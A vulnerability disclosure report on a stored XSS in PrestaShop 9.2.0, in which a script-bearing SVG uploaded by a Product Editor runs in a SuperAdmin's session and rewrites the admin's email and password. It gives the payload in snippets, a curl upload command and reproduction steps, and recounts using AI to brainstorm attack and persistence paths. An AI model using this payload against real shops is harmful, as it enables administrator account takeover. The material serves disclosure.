# Security Vulnerability Report: Administrator Account Takeover via Stored XSS (SVG File Upload in FileManager)

## 1. General Information

- Product: PrestaShop
- Tested version: 9.2.0
- Vulnerability type: Stored Cross-Site Scripting (XSS) — CWE-79
- Impact: Privilege escalation and administrator account takeover
- Entry point: Back Office FileManager SVG upload
- Final proof: SuperAdmin email/password changed and fresh login succeeded
- Reporter: Nguyễn Vương Tuấn Hiệp - nvth

---

## 2. Executive Summary

I first found this issue through black-box testing on PrestaShop 9.2.0.

The original bug is a Stored Cross-Site Scripting (Stored XSS) issue in SVG files uploaded through the Back Office file manager or logo uploader. An employee who is allowed to upload files can upload an SVG containing JavaScript. The SVG is then served from the shop's own origin. When a more privileged employee opens it, the script runs inside that employee's browser session and can perform administrative actions on their behalf.

I did not stop after proving that JavaScript executed inside the SVG. Once I had the XSS, I wanted to know how far a low-privileged employee could go:

1. Use black-box testing to upload a harmless SVG payload and confirm JavaScript execution.
2. Check which origin served the SVG and whether it ran inside an admin session.
3. Initially think about stealing a JWT or session token.
4. Use AI as a second pair of eyes to ask which state-changing actions the same-origin XSS could make the admin browser perform.
5. Trace the employee form and password-handling code in the source.
6. Use a controlled payload to change the SuperAdmin email and password.
7. Log in again with the new credentials and confirm the ATO.

The complete chain was:

Product Editor → Stored SVG XSS → SuperAdmin session → SuperAdmin credential change → admin account takeover

## 3. Discovery: from black-box XSS to ATO

### 2.1. Black-box: I found the XSS first

I started without reading the source code. I used a very small SVG with a harmless marker so I could tell whether JavaScript executed. After uploading it through the Back Office file manager and opening it in an admin context, the marker appeared. That was my first black-box proof: employee-uploaded SVG content was being handled by the browser as a document that could execute script.

Even after years of doing pentests, I would not call this an ATO yet. At that point I had only proven XSS, and it could still have been limited to a low-impact page. So I checked which origin served the file and which browser session was executing the script.

### 2.2. My first impact hypothesis: JWT or session theft

The first direction I considered was stealing a JWT, cookie, or admin session token and using it outside the browser. That is a common way to think about XSS, but it is not the only path.

Because the SVG was served from the same origin as the Back Office, the script could send requests from inside the admin browser. If those requests included the current cookie/session, I did not necessarily need to exfiltrate a token at all. I only needed to make the admin browser perform a state-changing action.

### 2.3. How I used AI to expand the hypothesis

At this point I used AI as a second pair of eyes. I asked it to help with impact discovery, not to replace evidence:

~~~text
I have Stored XSS in an SVG running on the same origin as the Back Office.
Besides stealing a JWT or session token, help me list state-changing
actions that the script could make the admin browser perform.
Point out which routes and forms I should trace in the source,
especially employee create/edit and password-related fields.
~~~

The useful direction from that discussion was to look beyond token theft and inspect forms that can create or edit employees, their CSRF tokens, and their POST actions. One variant suggested by AI was to make the admin browser submit the employee-create form and create a separate high-privileged ATO account. I did not use that variant as my final proof because it was not necessary; I chose the shorter and easier-to-verify self-edit path instead. This was only a hypothesis generated by AI; I still had to trace the source and reproduce the behavior in the browser — and at that point I still did not fully trust AI; I was busy “farming shrimp” on Telegram.

### 2.4. Source trace and the ATO proof

I then traced the application in this order:

1. What permission allows the Product Editor to open the file manager.
2. Whether the upload endpoint sanitizes SVG or only checks extension/MIME.
3. Which GET/POST route edits an employee.
4. Whether the form contains email and password-change fields.
5. How the form handler validates the old password and stores the new one.

I found that the SuperAdmin self-edit form still contained the email and change-password fields. I therefore chose the most direct proof: change the email and password of employee ID 1, then log in again from a fresh browser context. I did not need to create a second fake administrator; taking over the existing SuperAdmin account was already clear and independently verifiable.

## 4. Test Setup

To keep the privilege boundaries clear, I used two identities:

- Attacker: a Product Editor profile with product read/update permissions only.
- Victim: employee ID 1 with the SuperAdmin profile.

I intentionally did not give the Product Editor employee any employee-management permission. A direct request from that session must be rejected. The privilege escalation happens because the SuperAdmin browser performs the request after opening the stored SVG.

---

## 5. Technical Analysis: why can Product Editor upload an SVG?

### 5.1. The file manager only requires Product or CMS edit access

I first inspected admin-dev/filemanager/config/config.php to see what is required to open the file manager. It reads the current employee's permissions:

~~~php
$products_accesses = Profile::getProfileAccess(
    Context::getContext()->employee->id_profile,
    Tab::getIdFromClassName('AdminProducts')
);
$cms_accesses = Profile::getProfileAccess(
    Context::getContext()->employee->id_profile,
    Tab::getIdFromClassName('AdminCmsContent')
);

if (!$products_accesses['edit'] && !$cms_accesses['edit']) {
    throw new PrestaShopException('Access forbidden.');
}
~~~

This does four things:

1. Reads the current employee profile.
2. Checks edit access for AdminProducts.
3. Checks edit access for AdminCmsContent.
4. Allows the file manager to continue when either edit permission exists.

In my reproduction, Product Editor had only product read/update access and could still reach the upload flow. I did not need to grant the attacker full administrative access.

### 5.2. The upload endpoint does not remove JavaScript from SVG

I then checked admin-dev/filemanager/upload.php. The server checks the extension and detected MIME type:

~~~php
if (isset($info['extension'])
    && in_array(mb_strtolower($info['extension']), $ext)
    && in_array(mime_content_type($_FILES['file']['tmp_name']), $mime)
) {
    $tempFile = $_FILES['file']['tmp_name'];
    // ...
    move_uploaded_file($tempFile, $targetFile);
}
~~~

The code:

1. Gets the extension from the filename.
2. Gets the MIME type from the temporary file.
3. Moves the file to the upload directory when both values are allowed.

This is only a file-type check, not a content-safety check. The code does not parse the SVG and remove script, event handlers, or foreignObject content. In my reproduction, the file was stored under img/cms and served as image/svg+xml:

~~~text
/img/cms/svg-admin-takeover.svg
Content-Type: image/svg+xml
~~~

When I opened the URL directly, the browser treated the SVG as a document that could execute script.

## 6. Same-Origin Impact: why does the SVG run with SuperAdmin privileges?

After uploading it, I checked how the server served the file. The SVG was on the shop's own origin:

~~~text
http://localhost:8001/img/cms/svg-admin-takeover.svg
~~~

When I opened it as the SuperAdmin:

- location.origin is still http://localhost:8001.
- The Back Office cookie/session is sent by fetch when credentials: include is used.
- The script can call admin routes on the same origin.

In plain language: I uploaded the file with a low-privileged account, but the victim's browser executed it with the victim's privileges.

## 7. Employee Edit Path: the employee edit endpoint

The employee edit route accepts both GET and POST:

~~~yaml
admin_employees_edit:
  path: /{employeeId}/edit
  methods: [ GET, POST ]
~~~

The target URL I used was:

~~~text
/admin-dev/configure/advanced/employees/1/edit
~~~

The controller checks access, creates the form, handles the request, and calls the form handler:

~~~php
if (!$formAccessChecker->canAccessEditFormFor($employeeId)) {
    return $this->redirectToRoute('admin_employees_index');
}

$isRestrictedAccess = $formAccessChecker->isRestrictedAccess((int) $employeeId);

$employeeForm = $formBuilder->getFormFor((int) $employeeId, [], [
    'is_restricted_access' => $isRestrictedAccess,
    'is_for_editing' => true,
]);

$employeeForm->handleRequest($request);
$result = $formHandler->handleFor($employeeId, $employeeForm);
~~~

If I send this request directly from the Product Editor session, I am not a SuperAdmin and cannot edit employee ID 1. When the SVG runs in the SuperAdmin session, the request is treated as the SuperAdmin editing their own account, so it passes the relevant access checks.

## 8. Employee Form: which fields matter?

EmployeeType adds the email field and the nested change-password form:

~~~php
->add('email', EmailType::class, [
    'label' => $this->trans('Email address', [], 'Admin.Global'),
])
->add('change_password', ChangePasswordType::class, [
    'block_prefix' => 'change_password',
])
~~~

ChangePasswordType defines the current password and a repeated new password:

~~~php
->add('old_password', PasswordType::class, [
    'required' => true,
])
->add('new_password', RepeatedType::class, [
    'type' => PasswordType::class,
    'required' => true,
])
~~~

Because Symfony uses nested forms, the actual HTML field names are:

~~~text
employee[email]
employee[change_password][old_password]
employee[change_password][new_password][first]
employee[change_password][new_password][second]
~~~

In restricted self-edit mode, some fields are removed:

~~~php
if ($options['is_restricted_access']) {
    $builder
        ->remove('password')
        ->remove('active')
        ->remove('profile')
        ->remove('shop_association');
}
~~~

The email and change_password fields remain. That is enough for takeover; the payload does not need to change the role to SuperAdmin.

## 10. Code Walkthrough: line-by-line explanation

### 10.1. The async IIFE

~~~javascript
(async function () {
  // code runs as soon as the SVG is opened
})();
~~~

The IIFE executes immediately. async/await keeps the sequence predictable: GET the form, parse the HTML, locate the form, then POST the data.

### 10.2. Status rendering

escapeText makes the marker safe to display. show replaces the SVG content with foreignObject so the result is visible. This is only a debugging aid; it is not what creates the vulnerability.

### 10.3. Reading the token from the referrer

~~~javascript
var refUrl = document.referrer ? new URL(document.referrer) : null;
var query = '?' + refUrl.searchParams.toString();
~~~

The victim opened the employee edit page first, so the referrer contains the page query and token. The payload reuses that query when requesting the form. Without a valid token, Symfony may reject the POST.

In my automation, the tool sometimes did not preserve the referrer, so I used a current fallback token during testing. In a normal browser, the cleaner flow is to open the employee page first and then open the SVG without hard-coding a token.

### 10.4. credentials include

~~~javascript
fetch(editUrl, { credentials: 'include' });
~~~

This tells the browser to send the current cookies/session. Since the SVG and Back Office share an origin, the request is made using the victim's SuperAdmin session.

### 10.5. DOMParser

~~~javascript
var editHtml = await editResponse.text();
var parsed = new DOMParser().parseFromString(editHtml, 'text/html');
~~~

The payload does not guess the CSRF token or all hidden fields. It uses the real form rendered by the server and parses it in memory.

### 10.6. Selecting the correct form

~~~javascript
var forms = Array.from(parsed.querySelectorAll('form'));
var employeeForm = forms.find(function (candidate) {
  return candidate.querySelector(
    'input[name="employee[email]"]'
  );
});
~~~

This was the most important debugging detail in my reproduction. The Back Office page contains several forms, including the header search form. Using querySelector('form') can select the wrong one. That happened in my first attempt: the POST returned 200, but it targeted the search form, so the database did not change. Looking for employee[email] confirms that the selected form is the employee form.

### 10.7. FormData

~~~javascript
var data = new FormData(employeeForm);
~~~

This preserves the CSRF token, first name, last name, language, default page, and other required hidden fields. Building an empty FormData object often causes Symfony validation to reject the request.

### 10.8. Overwriting the email and password

~~~javascript
data.set('employee[email]', '<attacker-controlled-email>');
data.set(
  'employee[change_password][new_password][first]',
  '<controlled-new-password>'
);
~~~

The field names must match the Symfony form tree. Both repeated password fields must be set to the same value or RepeatedType reports a mismatch.

### 10.9. Sending the POST

~~~javascript
var action = employeeForm.getAttribute('action') || editUrl;
var postUrl = new URL(action, location.origin).href;

await fetch(postUrl, {
  method: 'POST',
  credentials: 'include',
  body: data
});
~~~

The POST activates the employee update path. A valid form causes the controller to redirect with 302 after saving. Therefore, a status code by itself is not enough; the final proof must be a database check and a fresh login.

## 11. Password Update: what the data handler does

After the POST was accepted, I traced EmployeeFormDataHandler to see where the data went. The handler builds an edit command:

~~~php
$command = (new EditEmployeeCommand($id))
    ->setEmail($data['email']);

if ($this->employeeFormAccessChecker->isRestrictedAccess((int) $id)) {
    $this->assertPasswordIsSameAsOldPassword(
        $data['change_password']['old_password'],
        $id
    );

    $command->setPlainPassword(
        $data['change_password']['new_password'],
        $this->minLength,
        $this->maxLength,
        $this->minScore
    );
}

$this->bus->handle($command);
~~~

The old password must be correct because the handler calls checkHash. The new password is then passed to the command and hashed according to the password policy before it is stored. In my reproduction, the email changed and the new bcrypt hash verified with the password supplied by the payload.

## 12. Steps to Reproduce

### Step 1 — Prepare the upload account

I created a Product Editor profile with product read/update only. I did not grant employee-management or SuperAdmin permissions.

### Step 2 — Upload the SVG

An equivalent multipart request is:

~~~bash
curl -i \
  -b attacker-cookies.txt \
  -F "path=" \
  -F "path_thumb=" \
  -F "type=0" \
  -F "lang=en" \
  -F "popup=1" \
  -F "field_id=0" \
  -F "fldr=" \
  -F "submit=OK" \
  -F "file=@svg-admin-takeover.svg;type=image/svg+xml" \
  http://localhost:8001/admin-dev/filemanager/upload.php
~~~

In my reproduction, the upload returned 302 and the file was then available under img/cms.

### Step 3 — SuperAdmin opens the employee page

I logged in as the SuperAdmin and opened:

~~~text
/admin-dev/configure/advanced/employees/1/edit
~~~

This created the employee form and placed the required token in the page URL/referrer, which allowed the payload to reuse the correct form and CSRF token.

### Step 4 — SuperAdmin opens the SVG

I then opened:

~~~text
/img/cms/svg-admin-takeover.svg
~~~

The script now runs in the SuperAdmin origin and session.

### Step 5 — Fetch and submit the form

My payload retrieves the real form, preserves hidden fields, changes the email and password, and posts to the employee edit endpoint.

### Step 6 — Verify the ATO

Check the database:

~~~sql
SELECT id_employee, email, id_profile, active,
       LENGTH(passwd) AS passwd_len
FROM ps_employee
WHERE id_employee = 1;
~~~

I then used a fresh browser context to log in with the new email/password and confirmed that the Back Office Dashboard was displayed.

## 13. Evidence I collected

The important observations I recorded were:

1. Product Editor authenticated successfully.
2. The file manager upload returned 302.
3. The SVG returned 200 with image/svg+xml.
4. The SuperAdmin browser fetched the employee form with 200.
5. The SuperAdmin browser posted to the employee edit endpoint and received 302.
6. The database showed the controlled email and a working replacement password hash.
7. A fresh browser context logged in and reached the Dashboard.

My first attempt returned 200 but did not change the database because the payload selected the header form. After changing the selector to the form containing employee[email], the database update succeeded. This is why I distinguish “the request was sent” from “account takeover was proven.”

---

## 14. Impact Analysis and Remediation

Impact I verified:

- Execute JavaScript with the session of a more privileged employee.
- Send administrative requests on behalf of that employee.
- Change the SuperAdmin login email and password.
- Continue using the Back Office as an administrator.

While using AI to explore the impact, I also identified a persistence direction: if the same SuperAdmin session can submit a Webservice-key or employee-create form, the attacker may be able to create access that survives a password change. That is a reasonable follow-up hypothesis, but I did not use it as the primary evidence in this report. The primary proof remains the changed SuperAdmin credentials and the successful fresh login.

---

## 15. My conclusion

The point I want to emphasize is that the Product Editor did not have direct permission to edit the SuperAdmin. My chain worked because:

1. Product Editor could upload an SVG.
2. The SVG was served from the same origin.
3. The SuperAdmin opened the SVG.
4. JavaScript ran with the SuperAdmin session.
5. The self-edit form allowed the email and password to be changed.

That is how the Stored XSS I found became privilege escalation and, ultimately, an administrator account takeover.
